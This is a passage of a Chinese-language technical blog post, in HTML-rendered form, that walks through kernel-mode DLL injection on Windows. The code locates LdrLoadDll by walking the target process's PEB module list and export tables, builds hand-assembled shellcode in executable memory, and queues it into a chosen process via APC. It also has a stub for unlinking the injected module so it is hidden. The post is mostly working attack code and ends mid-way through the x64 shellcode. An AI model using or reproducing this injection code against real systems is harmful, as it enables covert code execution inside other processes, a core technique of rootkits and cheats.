class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Get LdrLoadDll Address\r\n&quot;</span>);</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Call LdrLoadDll</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">SIZE_T RegionSize = <span class="number">0</span>;</span><br><span class="line">PINJECTION_DATA InjectionData = </span><br><span class="line">IsWow64 ? <span class="built_in">GetWow64Code</span>(LdrLoadDll, &amp;DllFullPath) : <span class="built_in">GetNativeCode</span>(LdrLoadDll, &amp;DllFullPath);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">ApcInjection</span>(InjectionData, (HANDLE)InjectionInfo-&gt;TargetProcessID, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (InjectionInfo-&gt;IsUnlinkModule)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ZwFreeVirtualMemory</span>(<span class="built_in">ZwCurrentProcess</span>(), &amp;InjectionData, &amp;RegionSize, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">KeUnstackDetachProcess</span>(&amp;Apc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;PsLookupProcessByProcessId() Error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EProcess)</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(EProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从目标进程通过模块名称获取模块基地址"><a href="#从目标进程通过模块名称获取模块基地址" class="headerlink" title="从目标进程通过模块名称获取模块基地址"></a>从目标进程通过模块名称获取模块基地址</h4><ol><li>检查EProcess</li><li>对WOW64和64位进程分别获取指定的PEB，并等待Loader初始化，然后再模块列表中搜索指定的模块名称，如果找到就返回基地址。注意WOW64需要转UNICODE</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">SeGetModuleBaseByModuleName</span><span class="params">(IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName, IN BOOLEAN IsWow64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EProcess == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">LARGE_INTEGER Timeout = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Timeout.QuadPart = <span class="number">-250ll</span> * <span class="number">10</span> * <span class="number">1000</span>;     <span class="comment">//250 msec.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Wow64 进程</span></span><br><span class="line"><span class="keyword">if</span> (IsWow64)</span><br><span class="line">&#123;</span><br><span class="line">PPEB32 Peb32 = (PPEB32)<span class="built_in">PsGetProcessWow64Process</span>(EProcess);</span><br><span class="line"><span class="keyword">if</span> (Peb32 == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;PsGetProcessWow64Process() Error\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待加载器</span></span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; !Peb32-&gt;Ldr &amp;&amp; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Not Intialiezd\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, TRUE, &amp;Timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有加载</span></span><br><span class="line"><span class="keyword">if</span> (!Peb32-&gt;Ldr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Was Not Intialiezd In Time\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在InLoadOrderModuleList链表中查找</span></span><br><span class="line"><span class="keyword">for</span> (PLIST_ENTRY32 ListEntry = (PLIST_ENTRY32)((PPEB_LDR_DATA32)Peb32-&gt;Ldr)-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">ListEntry != &amp;((PPEB_LDR_DATA32)Peb32-&gt;Ldr)-&gt;InLoadOrderModuleList;</span><br><span class="line">ListEntry = (PLIST_ENTRY32)ListEntry-&gt;Flink)</span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING v1;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY32 LdrDataTableEntry32 = <span class="built_in">CONTAINING_RECORD</span>(ListEntry, LDR_DATA_TABLE_ENTRY32, InLoadOrderLinks);</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlUnicodeStringInit</span>(&amp;v1, (PWCH)LdrDataTableEntry32-&gt;BaseDllName.Buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RtlCompareUnicodeString</span>(&amp;v1, ModuleName, TRUE) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> (PVOID)LdrDataTableEntry32-&gt;DllBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PPEB64 Peb64 = <span class="built_in">PsGetProcessPeb</span>(EProcess);</span><br><span class="line"><span class="keyword">if</span> (!Peb64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;PsGetProcessPeb() Error\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待加载器</span></span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; !Peb64-&gt;Ldr &amp;&amp; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Not Intialiezd\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, TRUE, &amp;Timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有加载</span></span><br><span class="line"><span class="keyword">if</span> (!Peb64-&gt;Ldr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Was Not Intialiezd In Time\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在InLoadOrderModuleList链表中查找</span></span><br><span class="line"><span class="keyword">for</span> (PLIST_ENTRY64 ListEntry = (PLIST_ENTRY64)((PPEB_LDR_DATA64)Peb64-&gt;Ldr)-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">ListEntry != &amp;((PPEB_LDR_DATA64)Peb64-&gt;Ldr)-&gt;InLoadOrderModuleList;</span><br><span class="line">ListEntry = (PLIST_ENTRY64)ListEntry-&gt;Flink)</span><br><span class="line">&#123;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY64 LdrDataTableEntry64 = <span class="built_in">CONTAINING_RECORD</span>(ListEntry, LDR_DATA_TABLE_ENTRY64, InLoadOrderLinks);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RtlCompareUnicodeString</span>(&amp;LdrDataTableEntry64-&gt;BaseDllName, ModuleName, TRUE) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> LdrDataTableEntry64-&gt;DllBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Exception:Code: 0x%X\n&quot;</span>, <span class="built_in">GetExceptionCode</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从目标模块获取目标函数导出地址"><a href="#从目标模块获取目标函数导出地址" class="headerlink" title="从目标模块获取目标函数导出地址"></a>从目标模块获取目标函数导出地址</h4><p>PE文件分析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">SeGetExportFunctionFromModule</span><span class="params">(IN PVOID ModuleBase, IN PCCHAR FunctionName, IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;</span><br><span class="line">PIMAGE_NT_HEADERS32 ImageNtHeader32 = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS64 ImageNtHeader64 = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY ImageExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line">ULONG ImageExportDirectoryLength = <span class="number">0</span>;</span><br><span class="line">ULONG_PTR FunctionAddress = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ModuleBase == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ImageNtHeader32 = (PIMAGE_NT_HEADERS32)((PUCHAR)ModuleBase + ImageDosHeader-&gt;e_lfanew);</span><br><span class="line">ImageNtHeader64 = (PIMAGE_NT_HEADERS64)((PUCHAR)ModuleBase + ImageDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (ImageNtHeader32-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 64位</span></span><br><span class="line"><span class="keyword">if</span> (ImageNtHeader32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line">ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase);</span><br><span class="line">ImageExportDirectoryLength = ImageNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32位</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase);</span><br><span class="line">ImageExportDirectoryLength = ImageNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUSHORT AddressOfNameOrdinals = (PUSHORT)(ImageExportDirectory-&gt;AddressOfNameOrdinals + (ULONG_PTR)ModuleBase);</span><br><span class="line">PULONG  AddressOfNames = (PULONG)(ImageExportDirectory-&gt;AddressOfNames + (ULONG_PTR)ModuleBase);</span><br><span class="line">PULONG  AddressOfFunctions = (PULONG)(ImageExportDirectory-&gt;AddressOfFunctions + (ULONG_PTR)ModuleBase);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; ++i)</span><br><span class="line">&#123;</span><br><span class="line">USHORT Index = <span class="number">0xFFFF</span>;</span><br><span class="line">PCHAR  v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按索引查找</span></span><br><span class="line"><span class="keyword">if</span> ((ULONG_PTR)FunctionName &lt;= <span class="number">0xFFFF</span>)</span><br><span class="line">&#123;</span><br><span class="line">Index = (USHORT)i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 按名字查找</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((ULONG_PTR)FunctionName &gt; <span class="number">0xFFFF</span> &amp;&amp; i &lt; ImageExportDirectory-&gt;NumberOfNames)</span><br><span class="line">&#123;</span><br><span class="line">v1 = (PCHAR)(AddressOfNames[i] + (ULONG_PTR)ModuleBase);</span><br><span class="line">Index = AddressOfNameOrdinals[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 参数错误</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((ULONG_PTR)FunctionName &lt;= <span class="number">0xFFFF</span> &amp;&amp; (USHORT)((ULONG_PTR)FunctionName) == Index + ImageExportDirectory-&gt;Base) ||</span><br><span class="line">((ULONG_PTR)FunctionName &gt; <span class="number">0xFFFF</span> &amp;&amp; <span class="built_in">strcmp</span>(v1, FunctionName) == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">FunctionAddress = AddressOfFunctions[Index] + (ULONG_PTR)ModuleBase;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是不是一个递归的导出  FuntionAddress = //Dll.Sub_4</span></span><br><span class="line"><span class="keyword">if</span> (FunctionAddress &gt;= (ULONG_PTR)ImageExportDirectory &amp;&amp; FunctionAddress &lt;= (ULONG_PTR)ImageExportDirectory</span><br><span class="line">+ ImageExportDirectoryLength)</span><br><span class="line">&#123;</span><br><span class="line">WCHAR v1[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANSI_STRING ForwarderString = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANSI_STRING ForwarderFunctionName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">UNICODE_STRING ForwarderModuleName = &#123; <span class="number">0</span> &#125;;  <span class="comment">//maxLength    Length  wchar*</span></span><br><span class="line">ULONG DelimIdx = <span class="number">0</span>;</span><br><span class="line">PVOID ForwardModuleBase = <span class="literal">NULL</span>;</span><br><span class="line">PVOID ForwardFunctionAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统镜像不支持</span></span><br><span class="line"><span class="keyword">if</span> (EProcess == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitAnsiString</span>(&amp;ForwarderString, (PCSZ)FunctionAddress);  <span class="comment">//FuntionAddress = //Dll.Sub_4........</span></span><br><span class="line"><span class="built_in">RtlInitEmptyUnicodeString</span>(&amp;ForwarderModuleName, v1, <span class="built_in">sizeof</span>(v1));</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlAnsiStringToUnicodeString</span>(&amp;ForwarderModuleName, &amp;ForwarderString, FALSE);</span><br><span class="line"><span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; ForwarderModuleName.Length / <span class="built_in">sizeof</span>(WCHAR); j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ForwarderModuleName.Buffer[j] == <span class="string">L&#x27;.&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ForwarderModuleName.Length = (USHORT)(j * <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">ForwarderModuleName.Buffer[j] = <span class="string">L&#x27;\0&#x27;</span>;</span><br><span class="line">DelimIdx = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取下一个模块的导出地址（递归的调用自己）</span></span><br><span class="line"><span class="built_in">RtlInitAnsiString</span>(&amp;ForwarderFunctionName, ForwarderString.Buffer + DelimIdx + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">RtlAppendUnicodeToString</span>(&amp;ForwarderModuleName, <span class="string">L&quot;.dll&quot;</span>);</span><br><span class="line">ForwardModuleBase = <span class="built_in">SeGetModuleBaseByModuleName</span>(EProcess, &amp;ForwarderModuleName, <span class="built_in">PsGetProcessWow64Process</span>(EProcess) != <span class="literal">NULL</span>);</span><br><span class="line">ForwardFunctionAddress = <span class="built_in">SeGetExportFunctionFromModule</span>(ForwardModuleBase, </span><br><span class="line">ForwarderFunctionName.Buffer, EProcess, &amp;ForwarderModuleName);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ForwardFunctionAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (PVOID)FunctionAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取ShellCode"><a href="#获取ShellCode" class="headerlink" title="获取ShellCode"></a>获取ShellCode</h4><p>WOW64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_INJECTION_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">UCHAR ShellCode[<span class="number">0x200</span>];</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING   DllFullPath;</span><br><span class="line">UNICODE_STRING32 DllFullPath32;</span><br><span class="line">&#125;;</span><br><span class="line">BOOLEAN IsUnlinkModule;              <span class="comment">// Unlink module after injection</span></span><br><span class="line"><span class="type">wchar_t</span> BufferData[<span class="number">488</span>];   <span class="comment">//??   APC使用</span></span><br><span class="line">PVOID ModuleBase;          <span class="comment">//??</span></span><br><span class="line">ULONG CallComplete;</span><br><span class="line">&#125;INJECTION_DATA, *PINJECTION_DATA;</span><br><span class="line"></span><br><span class="line"><span class="function">PINJECTION_DATA <span class="title">GetWow64Code</span><span class="params">(IN PVOID LdrLoadDll, IN PUNICODE_STRING DllFullPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PINJECTION_DATA RemoteBufferData = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T RemoteBufferLength = PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">UCHAR ShellCode[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// push ModuleHandle            offset +1 </span></span><br><span class="line"><span class="number">0x68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// push ModuleFileName          offset +6</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,                                <span class="comment">// push Flags  </span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,                                <span class="comment">// push PathToFile</span></span><br><span class="line"><span class="number">0xE8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// call LdrLoadDll              offset +15</span></span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// mov edx, COMPLETE_OFFSET     offset +20</span></span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x1E</span>, <span class="number">0x37</span>, <span class="number">0xC0</span>,     <span class="comment">// mov [edx], CALL_COMPLETE            //给APC使用</span></span><br><span class="line"><span class="number">0xC2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>                        <span class="comment">// ret 4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">ZwAllocateVirtualMemory</span>(<span class="built_in">ZwCurrentProcess</span>(), &amp;RemoteBufferData, <span class="number">0</span>, &amp;RemoteBufferLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 准备完整路径</span></span><br><span class="line">PUNICODE_STRING32 v1 = &amp;RemoteBufferData-&gt;DllFullPath32;</span><br><span class="line">v1-&gt;Length = DllFullPath-&gt;Length;</span><br><span class="line">v1-&gt;MaximumLength = DllFullPath-&gt;MaximumLength;</span><br><span class="line">v1-&gt;Buffer = (ULONG)(ULONG_PTR)RemoteBufferData-&gt;BufferData;</span><br><span class="line"><span class="built_in">memcpy</span>((PVOID)v1-&gt;Buffer, DllFullPath-&gt;Buffer, DllFullPath-&gt;Length);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备ShellCode</span></span><br><span class="line"><span class="built_in">memcpy</span>(RemoteBufferData-&gt;ShellCode, ShellCode, <span class="built_in">sizeof</span>(ShellCode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充结构所需要的参数</span></span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">1</span>) = (ULONG)(ULONG_PTR)&amp;RemoteBufferData-&gt;ModuleBase;</span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">6</span>) = (ULONG)(ULONG_PTR)v1;</span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">15</span>) = (ULONG)((ULONG_PTR)LdrLoadDll - ((ULONG_PTR)RemoteBufferData + <span class="number">15</span>) - <span class="number">5</span> + <span class="number">1</span>);</span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">20</span>) = (ULONG)(ULONG_PTR)&amp;RemoteBufferData-&gt;CallComplete;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RemoteBufferData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 